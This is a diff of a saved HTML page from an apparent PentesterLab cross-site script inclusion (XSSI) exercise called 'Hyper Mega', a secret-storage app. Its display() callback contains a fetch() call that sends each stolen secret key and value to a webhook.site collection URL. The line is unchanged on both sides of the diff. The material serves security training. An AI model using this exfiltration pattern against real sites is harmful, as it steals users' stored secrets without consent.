@@ -3,7 +3,7 @@
 <meta http-equiv="content-type" content="text/html; charset=UTF-8">
     <title>Hyper Mega by PentesterLab: Secret Storage made easy</title>
     <meta name="csrf-param" content="authenticity_token">
-<meta name="csrf-token" content="I+tQJ3ggOJzRZWhDf141f8vxaPDDidNsrFKSd4KYqT2+eJRfpvVYz1zv825LJCdc6yMZSDoPsfXkNEAVHYe0wA==">
+<meta name="csrf-token" content="gYlCKE3wP9rELvmaai3olQulfkOybwPmu+6yfuYAu4B7+jgCpJ+HCCampQ359BaU/Vv9FuF3hBCrPxKkDKUgCA==">
     
 
     <link rel="stylesheet" media="all" href="xssi_files/application-7f3efcead33723e7a5674390ebbcbc7709e85f0cf36ad019.css" data-turbolinks-track="reload">
@@ -16,7 +16,7 @@
     <title></title>
       <h5 class="my-0 mr-md-auto font-weight-normal"><a href="https://pentesterlab.com/">PentesterLab</a></h5>
       <nav class="my-2 my-md-0 mr-md-3">
-        <a class="btn btn-outline-danger" href="http://ptl-8d001942-2ea37de7.libcurl.so/logout">Logout</a>
+        <a class="btn btn-outline-danger" href="http://ptl-08500332-74964989.libcurl.so/logout">Logout</a>
       </nav>
     </div>
 
@@ -29,7 +29,7 @@
 
 <h3>Manage your secrets</h3>
 
-<ul id="secrets"><li>test:test</li></ul>
+<ul id="secrets"></ul>
 <script>
 function display(data) {
   var ul= document.getElementById("secrets");
@@ -38,13 +38,12 @@ function display(data) {
     var li = document.createElement("li");
     li.appendChild(document.createTextNode(key+":"+data[key]));
     ul.appendChild(li);
-    fetch('http://webhook.site/b8d6fabd-4739-4d22-b76a-5718a8da4609?val='+key+'&key='+data[key]);
+    fetch('http://webhook.site/b8d6fabd-4739-4d22-b76a-5718a8da4609?val='+key+'&key='+data[key]);	
   }
-
 
 }
 </script>
-<a href="http://ptl-8d001942-2ea37de7.libcurl.so/secrets/new">Add a secret</a>
+<a href="http://ptl-08500332-74964989.libcurl.so/secrets/new">Add a secret</a>
 <script src="xssi_files/secrets.js">
 </script>
 
